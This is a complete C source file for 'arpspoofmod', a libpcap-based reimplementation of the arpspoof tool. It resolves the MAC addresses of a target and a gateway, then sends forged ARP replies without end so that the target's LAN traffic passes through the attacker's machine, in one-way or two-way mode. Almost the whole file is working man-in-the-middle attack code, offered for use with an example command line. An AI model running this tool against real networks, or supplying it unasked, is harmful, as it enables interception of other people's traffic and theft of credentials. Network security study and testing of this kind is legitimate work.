/*
    Copyright 2015 lngost
    See <https://github.com/lngost>
    
    License
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*
NAME
    arpspoofmod - intercept packets on a switched LAN, another implementation
                  of Dug Song's arpspoof tool.

SYNOPSIS
    arpspoofmod -i interface -t target [-r] host

DESCRIPTION
    arpspoofmod is another implementation of Dug Song's arpspoof tool, it 
    does nearly the same behaviour with minor different.
    
    arpspoofmod redirects packets from a target host on the LAN intended for 
    another host on the LAN by forging ARP replies.
    
    Kernel IP forwarding (or a userland program which accomplishes the same)
    must be turned on ahead of time.
    
    The reasons for this program is written:
    (1) Practice purpose
    (2) The Dug Song's arpspoof is a well-known tool that can be found on 
        many platforms. However, some of the implementations may not act 
        as it claims due to modification of the source. For example, 
        it will only work on remote mode even without -r option provided, 
        which makes you exposed to the gateway. Another example is that 
        it sends broadcast arp replies even a non-broadcast target ip is 
        specified, which really makes a mess.

OPTIONS
    -i interface
        Specify the interface to use.
        (Must specify an interface.)
    
    -t target
        Specify a particular host to ARP poison.
        (Must specify a target, one target only.)
        
    -r
        remote mode.
        Posion both hosts (host and target) to capture traffic in both
        directions. (Only valid in conjunction with -t)
        If not specified, arpspoofmod will run on oneway mode, which 
        only poisons target to capture traffic from target to host.
        
    host
        Specify the host you wish to intercept packets for.
        (Usually the gateway.)
        (Must specify a host, one host only.)

EXAMPLE
    Let's say a target is at 192.168.1.5, and the gateway is at 192.168.1.1
    arpspoofmod -i eth0 -t 192.168.1.5 192.168.1.1
    
PRIVILEGES
    arpspoofmod may need root privileges to send packets on Linux.
    arpspoofmod may NOT require any special privileges to send packets on OSX.

*/

/*
    File name: arpspoofmod.c
    Author: lngost
    
    Description:
        Written by c with libpcap and pthread.
        May need -lpcap and -lpthread CFLAGS to compile.
    
    Work flow:
        * Send broadcast arp request packets to get 
          mac addresses of target and host.
        * Keep sending arp reply packets to poison.
        * Re-arping victims after ^c pressed and quit.
    
    Compile example:
        OSX: clang -std=gnu99 -lpcap -o arpspoofmod
        Linux: gcc -std=gnu99 -lpcap -lpthread -o arpspoofmod
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h> // AF_LINK on OSX, AF_PACKET on Linux
#include <pcap.h> // libpcap
#include <net/ethernet.h> // struct ether_header, ETHERTYPE_ARP, ETHER_ADDR_LEN
#include <netinet/if_ether.h> // struct ehter_arp
#include <arpa/inet.h> // uint16_t htons()
#include <net/if.h> // IFNAMSIZ
#include <regex.h> // regular expression
#include <signal.h> // ^c - SIGINT, sig_t signal()
#include <pthread.h> // threads
#include <ifaddrs.h> // struct ifaddrs, int getifaddrs(), void freeifaddrs()

#ifdef __linux__
#include <netpacket/packet.h> // struct sockaddr_ll
#else
#include <net/if_dl.h> // struct sockaddr_dl
#endif

// Version
const char VERSION[] = "1.0";

// ip string length
#define IPSTRLEN 16

// options
struct G_Option {
    bool interface; // option -i
    bool target; // option -t
    bool remote; // option -r
} g_option;

/*
IP reg exp description:
250-255: 25[0-5]
200-249: 2[0-4][0-9]
100-199: 1[0-9]{2}
10-99:   0?[1-9][0-9]
0-9:     0{0,2}[0-9]
*/
const char pattern[] = "^((0{0,2}[0-9]|0?[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}(0{0,2}[0-9]|0?[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$";


const u_char BROADCAST_MAC[ETHER_ADDR_LEN] = {0xff,0xff,0xff,0xff,0xff,0xff};
const u_char EMPTY_MAC[ETHER_ADDR_LEN] = {0,0,0,0,0,0};

// global variables
char ifname[IFNAMSIZ]; // network interface device name
u_char sourceip[4]; // self network interface ip
u_char targetip[4]; // target ip
u_char hostip[4]; // host ip (usually the gateway)
u_char sourcemac[ETHER_ADDR_LEN]; // self network interface mac
u_char targetmac[ETHER_ADDR_LEN]; // target mac
u_char hostmac[ETHER_ADDR_LEN]; // host mac

bool flag_tmac_got = false;
bool flag_hmac_got = false;

pcap_t *pt = NULL;

/***************************************
void usage() - usage information
***************************************/
void usage() {
    printf("Command: arpspoofmod -i interface -t target [-r] host\n");
    printf("arpspoofmod -h for help.\n");
}

/***************************************
void version() - version information
***************************************/
void version() {
    printf("Version: arpspoofmod-%s\n", VERSION);
}

/***************************************
void help() - help information
***************************************/
void help() {
    printf("Command: arpspoofmod -i interface -t target [-r] host\n");
    printf("OPTIONS\n\
    -i interface\n\
        Specify the interface to use.\n\
        (Must specify an interface.)\n\
    \n\
    -t target\n\
        Specify a particular host to ARP poison.\n\
        (Must specify a target, one target only.)\n\
        \n\
    -r\n\
        remote mode.\n\
        Posion both hosts (host and target) to capture traffic in both\n\
        directions. (Only valid in conjunction with -t)\n\
        If not specified, arpspoofmod will run on oneway mode, which \n\
        only poisons target to capture traffic from target to host.\n\
        \n\
    host\n\
        Specify the host you wish to intercept packets for.\n\
        (Usually the gateway.)\n\
        (Must specify a host, one host only.)\n");
}

/***************************************
void setInterfaceName(char *ifname)
    - check interface name length
      and copy it to ifname[]
***************************************/
void setInterfaceName(char *ifname) {
    if(strlen(optarg) > IFNAMSIZ - 1) {
        printf("Invalid interface name.\n");
        exit(EXIT_FAILURE);
    }
    
    strncpy(ifname, optarg, strlen(optarg));
}

/***************************************
void regIPCheck(const char *argv, const char *iptext)
    - using regular expression to check
      ip string format.
***************************************/
void regIPCheck(const char *argv, const char *iptext) {
    regex_t reg;
    size_t nmatch = 1;
    regmatch_t pmatch[1];
    int errcode;
    char errbuf[1024];
    
    if((errcode = regcomp(&reg, pattern, REG_EXTENDED)) != 0) {
        regerror(errcode, &reg, errbuf, sizeof(errbuf));
        fprintf(stderr, "regcomp() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    errcode = regexec(&reg, iptext, nmatch, pmatch, 0);
    if(errcode == REG_NOMATCH) {
        //regerror(errcode, &reg, errbuf, sizeof(errbuf)); // for regexec() debug
        //fprintf(stderr, "regexec() no match: %s\n", errbuf); // for regexec() debug
        printf("%s: Invalid ip format.\n", argv);
        exit(EXIT_FAILURE);
    } else if(errcode != 0) {
        regerror(errcode, &reg, errbuf, sizeof(errbuf));
        fprintf(stderr, "regexec() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }
    
    regfree(&reg);
}

/***************************************
void ipTextConvert(u_char *ip, const char *iptext)
    - convert and copy ip from string to unsigned char
    - example:
        from string: "192.168.1.1"
        to unsigned char: {192,168,1,1}
***************************************/
void ipTextConvert(u_char *ip, const char *iptext) {
    int ip_index = 0;
    int ihead = 0;
    char temp[4];
    memset(ip, 0, 4);
    memset(temp, 0, 4);
    for(int i=0; i<strlen(iptext); ++i) {
        if(iptext[i] >= '0' && iptext[i] <= '9') {
            temp[ihead] = iptext[i];
            ++ihead;
        }
        
        if(iptext[i] == '.' || i == strlen(iptext)-1) {
            ip[ip_index] = atoi(temp);
            ++ip_index;
            ihead = 0;
            memset(temp, 0, 4);
        }
    }
}

/***************************************
void getLocalAddr(char *argv, char *ifname, u_char *sourcemac, u_char *sourceip)
    - get local ip and mac address of interface ifname[], 
      and copy them to sourceip[] and sourcemac[] separately.
    - different implementation depends on platforms: OSX and Linux
***************************************/
void getLocalAddr(char *argv, char *ifname, u_char *sourcemac, u_char *sourceip) {
    struct ifaddrs *ifap = NULL;
    struct ifaddrs *cur = NULL;
    if(getifaddrs(&ifap) == -1) {
        perror("getifaddrs() failed");
        exit(EXIT_FAILURE);
    }
    if(ifap == NULL) {
        fprintf(stderr, "No interface found.\n");
        exit(EXIT_FAILURE);
    } else {
        cur = ifap;
    }
    
    bool macfound = false;
    bool ipfound = false;
    while(cur != NULL) {
        if(strcmp(ifname, cur->ifa_name) == 0) {
#ifdef __linux__
            if(cur->ifa_addr != NULL && cur->ifa_addr->sa_family == AF_PACKET) {
                macfound = true;
                struct sockaddr_ll *sll = (struct sockaddr_ll *)cur->ifa_addr;
                for(int i=0; i<6; ++i) {
                    sourcemac[i] = sll->sll_addr[i];
                }
            }
#else
            if(cur->ifa_addr != NULL && cur->ifa_addr->sa_family == AF_LINK) {
                macfound = true;
                struct sockaddr_dl *sdl = (struct sockaddr_dl *)cur->ifa_addr;
                unsigned char *mac = (unsigned char *)(LLADDR(sdl));
                for(int i=0; i<6; ++i) {
                    sourcemac[i] = mac[i];
                }
            }
#endif
            if(cur->ifa_addr != NULL && cur->ifa_addr->sa_family == AF_INET) {
                ipfound = true;
                struct sockaddr_in *sdi = (struct sockaddr_in *)cur->ifa_addr;
                unsigned int addr = ntohl(sdi->sin_addr.s_addr);
                sourceip[0] = (addr >> 24) & 0xff;
                sourceip[1] = (addr >> 16) & 0xff;
                sourceip[2] = (addr >> 8) & 0xff;
                sourceip[3] = addr & 0xff;
            }
        }
        
        if((macfound && ipfound) || cur->ifa_next == NULL) {
            cur = NULL;
        } else {
            cur = cur->ifa_next;
        }
    }
    if(!macfound) {
        freeifaddrs(ifap);
        fprintf(stderr, "%s: MAC address of interface %s not found.\n", argv, ifname);
        exit(EXIT_FAILURE);
    }
    if(!ipfound) {
        freeifaddrs(ifap);
        fprintf(stderr, "%s: IP address of interface %s not found.\n", argv, ifname);
        exit(EXIT_FAILURE);
    }
    freeifaddrs(ifap);
}

/***************************************
void arpFrameBuild(u_char *frame, 
                    const u_char *ehead_target_mac, 
                    const u_char *ehead_source_mac,
                    const u_short ar_op,
                    const u_char *ar_sha,
                    const u_char *ar_spa,
                    const u_char *ar_tha,
                    const u_char *ar_tpa)
    
    - used to create an arp frame, total 42 bytes.
    - some fields are fixed as they have no difference 
      to create an arp request or reply.
***************************************/
void arpFrameBuild(u_char *frame, 
                    const u_char *ehead_target_mac, 
                    const u_char *ehead_source_mac,
                    const u_short ar_op,
                    const u_char *ar_sha,
                    const u_char *ar_spa,
                    const u_char *ar_tha,
                    const u_char *ar_tpa) {
    struct ether_header e_head;
    struct ether_arp e_arp;
    
    memcpy(e_head.ether_dhost, ehead_target_mac, ETHER_ADDR_LEN);
    memcpy(e_head.ether_shost, ehead_source_mac, ETHER_ADDR_LEN);
    e_head.ether_type = htons(ETHERTYPE_ARP);
    
    e_arp.arp_hrd = htons(ARPHRD_ETHER);
    e_arp.arp_pro = htons(ETHERTYPE_IP);
    e_arp.arp_hln = ETHER_ADDR_LEN;
    e_arp.arp_pln = 4;
    e_arp.arp_op = htons(ar_op);
    memcpy(e_arp.arp_sha, ar_sha, ETHER_ADDR_LEN);
    memcpy(e_arp.arp_spa, ar_spa, 4);
    memcpy(e_arp.arp_tha, ar_tha, ETHER_ADDR_LEN);
    memcpy(e_arp.arp_tpa, ar_tpa, 4);
    
    memcpy(frame, &e_head, sizeof(struct ether_header));
    memcpy(frame + sizeof(struct ether_header), &e_arp, sizeof(struct ether_arp));
}

/***************************************
void packetget(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
    - called by pcap_loop().
    - capture arp reply packets that contain mac address of target and host.
***************************************/
void packetget(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    u_short arpop = (u_short)*(packet+21);
    u_char src[ETHER_ADDR_LEN];
    u_char srcip[4];
    u_char dst[ETHER_ADDR_LEN];
    u_char dstip[4];
    if(arpop == ARPOP_REPLY) {
        for(int i=0; i<ETHER_ADDR_LEN; ++i) {
            src[i] = *(packet+22+i);
            dst[i] = *(packet+22+ETHER_ADDR_LEN+4+i);
        }
        for(int i=0; i<4; ++i) {
            srcip[i] = *(packet+22+ETHER_ADDR_LEN+i);
            dstip[i] = *(packet+22+ETHER_ADDR_LEN*2+4+i);
        }
        
        if(memcmp(targetip, srcip, 4) == 0 
            && memcmp(sourceip, dstip, 4) == 0 
            && memcmp(sourcemac, dst, ETHER_ADDR_LEN) == 0) {
            flag_tmac_got = true;
            memcpy(targetmac, src, ETHER_ADDR_LEN);
        } else if(memcmp(hostip, srcip, 4) == 0 
            && memcmp(sourceip, dstip, 4) == 0 
            && memcmp(sourcemac, dst, ETHER_ADDR_LEN) == 0) {
            flag_hmac_got = true;
            memcpy(hostmac, src, ETHER_ADDR_LEN);
        }
    }
}

/***************************************
void *packetcap(void *pcapt)
    - called when a thread is created 
      to capture arp packets.
***************************************/
void *packetcap(void *pcapt) {
    pcap_t *pt;
    pt = (pcap_t *)pcapt;
    if(pcap_loop(pt, -1, packetget, NULL) == -1) {
        pcap_perror(pt, "pcap_loop() failed");
        pcap_close(pt);
        exit(EXIT_FAILURE);
    }
    
    pthread_exit(NULL);
}

/***************************************
void reARPing()
    - called when ^c pressed.
    - re-arping victims and quit.
***************************************/
void reARPing() {
    u_char rearpTarget[42];
    u_char rearpHost[42];
    /*
    void arpFrameBuild(u_char *frame, 
                    const u_char *ehead_target_mac, 
                    const u_char *ehead_source_mac,
                    const u_short ar_op,
                    const u_char *ar_sha,
                    const u_char *ar_spa,
                    const u_char *ar_tha,
                    const u_char *ar_tpa)
    */
    arpFrameBuild(rearpTarget, targetmac, sourcemac, ARPOP_REPLY, hostmac, hostip, targetmac, targetip);
    arpFrameBuild(rearpHost, hostmac, sourcemac, ARPOP_REPLY, targetmac, targetip, hostmac, hostip);
    printf("\nRe-ARPing victims...\n");
    int loop = 5;
    while(loop != 0) {
        if(g_option.remote) {
            if(pcap_inject(pt, rearpTarget, sizeof(rearpTarget)) == -1) {
                pcap_perror(pt, "pcap_inject() failed");
                goto exitfailure;
            }
            if(pcap_inject(pt, rearpHost, sizeof(rearpHost))== -1) {
                pcap_perror(pt, "pcap_inject() failed");
                goto exitfailure;
            }
        } else {
            if(pcap_inject(pt, rearpTarget, sizeof(rearpTarget)) == -1) {
                pcap_perror(pt, "pcap_inject() failed");
                goto exitfailure;
            }
        }
        
        sleep(1);
        --loop;
    }
    printf("Done re-arping. Quitting program...\n");
    pcap_close(pt);
    pthread_exit(NULL);
    exit(EXIT_SUCCESS);
    
    exitfailure:
    printf("Quitting program...\n");
    pcap_close(pt);
    pthread_exit(NULL);
    exit(EXIT_FAILURE);
}

/***************************************
Main function
***************************************/
int main(int argc, char **argv) {
    if(argc == 1) {
        usage();
        return 0;
    }
    
    // initialising option flag
    g_option.interface = false;
    g_option.target = false;
    g_option.remote = false;
    
    // get options
    int ch;
    while((ch = getopt(argc, argv, "i:t:rvh")) != -1) {
        switch(ch) {
            case 'i':
                g_option.interface = true;
                setInterfaceName(ifname);
                break;
            case 't':
                g_option.target = true;
                regIPCheck(argv[0], optarg);
                if(strlen(optarg) < IPSTRLEN) {
                    ipTextConvert(targetip, optarg);
                }
                break;
            case 'r':
                g_option.remote = true;
                break;
            case 'v':
                version();
                return 0;
                break;
            case 'h':
                help();
                return 0;
                break;
            default: break;
        }
    }
    if(argc != optind+1) {
        fprintf(stderr, "%s: missing argument -- host\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    regIPCheck(argv[0], argv[optind]);
    if(strlen(argv[optind]) < IPSTRLEN) {
        ipTextConvert(hostip, argv[optind]);
    }
    
    // check option dependencies
    if(!g_option.interface) {
        fprintf(stderr, "%s: interface not specified.\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    if(!g_option.target) {
        fprintf(stderr, "%s: target not specified.\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    if(g_option.remote && !g_option.target) {
        fprintf(stderr, "%s: [-r] only valid in conjunction with [-t target]\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    // print settings
    printf("* Interface: %s\n", ifname);
    printf("* Target IP: ");
    for(int i=0; i<4; ++i) {
        printf("%d", targetip[i]);
        if(i < 3) { printf("."); }
        else { printf("\n"); }
    }
    printf("* Host IP: ");
    for(int i=0; i<4; ++i) {
        printf("%d", hostip[i]);
        if(i < 3) { printf("."); }
        else { printf("\n"); }
    }
    if(g_option.remote) {
        printf("* Mode: remote\n");
    } else {
        printf("* Mode: oneway\n");
    }
    
    
    // get MAC address of network interface named ifname[], save to sourcemac[]
    getLocalAddr(argv[0], ifname, sourcemac, sourceip);
    
    
    // pcap initialisation
    //pcap_t *pt = NULL; // already defined as a global variable
    char errbuf[PCAP_ERRBUF_SIZE]; // must have, see man 3 pcap
    
    pt = pcap_open_live(ifname, 2048, 1, 1000, errbuf);
    if(pt == NULL) {
        fprintf(stderr, "pcap_open_live() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }
    
    // packet capture
    // compile and set filter
    bpf_u_int32 net;
    bpf_u_int32 mask;
    struct bpf_program fp;
    char filterstr[] = "arp";
    if(pcap_lookupnet(ifname, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "%s pcap_lookupnet() failed: %s\n", argv[0], errbuf);
        pcap_freecode(&fp);
        pcap_close(pt);
        exit(EXIT_FAILURE);
    }
    if(pcap_compile(pt, &fp, filterstr, 0, mask) == -1) {
        pcap_perror(pt, "pcap_compile() failed");
        pcap_freecode(&fp);
        pcap_close(pt);
        exit(EXIT_FAILURE);
    }
    if(pcap_setfilter(pt, &fp) == -1) {
        pcap_perror(pt, "pcap_setfilter() failed");
        pcap_freecode(&fp);
        pcap_close(pt);
        exit(EXIT_FAILURE);
    }
    
    // a thread to capture arp reply packets
    pthread_t thread_cap;
    int rc;
    rc = pthread_create(&thread_cap, NULL, packetcap, (void *)pt);
    if(rc != 0) {
        fprintf(stderr, "%s: pthread_create() failed code: %d\n", argv[0], rc);
    }
    
    
    
    // arp frame
    u_char arpReqTarget[42];
    u_char arpReqHost[42];
    
    /*
    void arpFrameBuild(u_char *frame, 
                    const u_char *ehead_target_mac, 
                    const u_char *ehead_source_mac,
                    const u_short ar_op,
                    const u_char *ar_sha,
                    const u_char *ar_spa,
                    const u_char *ar_tha,
                    const u_char *ar_tpa)
    */
    // send arp request to get mac addresses of target and host
    arpFrameBuild(arpReqTarget, BROADCAST_MAC, sourcemac, ARPOP_REQUEST, sourcemac, sourceip, EMPTY_MAC, targetip);
    arpFrameBuild(arpReqHost, BROADCAST_MAC, sourcemac, ARPOP_REQUEST, sourcemac, sourceip, EMPTY_MAC, hostip);
    
    // 10 while loops to send arp request packets, 
    // may finish earlier if both mac address of target and host are captured.
    int loop = 10; 
    while(loop != 0) {
        if(pcap_inject(pt, arpReqTarget, sizeof(arpReqTarget)) == -1) {
            pcap_perror(pt, "pcap_inject() failed");
            goto exitfailure;
        }
        if(pcap_inject(pt, arpReqHost, sizeof(arpReqHost))== -1) {
            pcap_perror(pt, "pcap_inject() failed");
            goto exitfailure;
        }
        sleep(1);
        
        if(flag_tmac_got && flag_hmac_got) {
            pcap_breakloop(pt);
            pcap_freecode(&fp);
            break;
        }
        
        --loop;
    }
    

    if(!flag_tmac_got) {
        fprintf(stderr, "%s: mac address of target %d.%d.%d.%d not found.\n", argv[0], targetip[0],targetip[1],targetip[2],targetip[3]);
        goto exitfailure;
    }
    if(!flag_hmac_got) {
        fprintf(stderr, "%s: mac address of host %d.%d.%d.%d not found.\n", argv[0], hostip[0],hostip[1],hostip[2],hostip[3]);
        goto exitfailure;
    }
    
    // set signal for re-arping when ^c pressed
    signal(SIGINT, reARPing); // re-arping after SIGINT received
    
    // all the information ready, create arp frame to attack
    u_char arpToTarget[42];
    u_char arpToHost[42];
    
    /*
    void arpFrameBuild(u_char *frame, 
                    const u_char *ehead_target_mac, 
                    const u_char *ehead_source_mac,
                    const u_short ar_op,
                    const u_char *ar_sha,
                    const u_char *ar_spa,
                    const u_char *ar_tha,
                    const u_char *ar_tpa)
    */
    arpFrameBuild(arpToTarget, targetmac, sourcemac, ARPOP_REPLY, sourcemac, hostip, targetmac, targetip);
    arpFrameBuild(arpToHost, hostmac, sourcemac, ARPOP_REPLY, sourcemac, targetip, hostmac, hostip);
    printf("ARP poisoning start...\n");
    bool info = false;
    while(1) {
        if(g_option.remote) {
            if(pcap_inject(pt, arpToTarget, sizeof(arpToTarget)) == -1) {
                pcap_perror(pt, "pcap_inject() failed");
                goto exitfailure;
            }
            if(pcap_inject(pt, arpToHost, sizeof(arpToHost))== -1) {
                pcap_perror(pt, "pcap_inject() failed");
                goto exitfailure;
            }
            
            if(!info) {
                info = true;
                printf("%02x:%02x:%02x:%02x:%02x:%02x -> %02x:%02x:%02x:%02x:%02x:%02x  Host IP %d.%d.%d.%d is at %02x:%02x:%02x:%02x:%02x:%02x\n", 
                        sourcemac[0],sourcemac[1],sourcemac[2],sourcemac[3],sourcemac[4],sourcemac[5], 
                        targetmac[0],targetmac[1],targetmac[2],targetmac[3],targetmac[4],targetmac[5], 
                        hostip[0],hostip[1],hostip[2],hostip[3], 
                        sourcemac[0],sourcemac[1],sourcemac[2],sourcemac[3],sourcemac[4],sourcemac[5]);
                printf("%02x:%02x:%02x:%02x:%02x:%02x -> %02x:%02x:%02x:%02x:%02x:%02x  Target IP %d.%d.%d.%d is at %02x:%02x:%02x:%02x:%02x:%02x\n", 
                        sourcemac[0],sourcemac[1],sourcemac[2],sourcemac[3],sourcemac[4],sourcemac[5], 
                        hostmac[0],hostmac[1],hostmac[2],hostmac[3],hostmac[4],hostmac[5], 
                        targetip[0],targetip[1],targetip[2],targetip[3], 
                        sourcemac[0],sourcemac[1],sourcemac[2],sourcemac[3],sourcemac[4],sourcemac[5]);
                printf("* ARP poisoning is ON, information above only displayed once, using 'control + c' to stop.\n");
            }
        } else {
            if(pcap_inject(pt, arpToTarget, sizeof(arpToTarget)) == -1) {
                pcap_perror(pt, "pcap_inject() failed");
                goto exitfailure;
            }
            
            if(!info) {
                info = true;
                printf("%02x:%02x:%02x:%02x:%02x:%02x -> %02x:%02x:%02x:%02x:%02x:%02x  Host IP %d.%d.%d.%d is at %02x:%02x:%02x:%02x:%02x:%02x\n", 
                        sourcemac[0],sourcemac[1],sourcemac[2],sourcemac[3],sourcemac[4],sourcemac[5], 
                        targetmac[0],targetmac[1],targetmac[2],targetmac[3],targetmac[4],targetmac[5], 
                        hostip[0],hostip[1],hostip[2],hostip[3], 
                        sourcemac[0],sourcemac[1],sourcemac[2],sourcemac[3],sourcemac[4],sourcemac[5]);
                printf("* ARP poisoning is ON, information above only displayed once, using 'control + c' to stop.\n");
            }
        }
        
        sleep(2);
    }
    
    
    pcap_close(pt);
    pthread_exit(NULL);
    return 0;
    
    
    exitfailure:
    printf("Quitting program...\n");
    pcap_breakloop(pt);
    pcap_freecode(&fp);
    pcap_close(pt);
    pthread_exit(NULL);
    exit(EXIT_FAILURE);
}


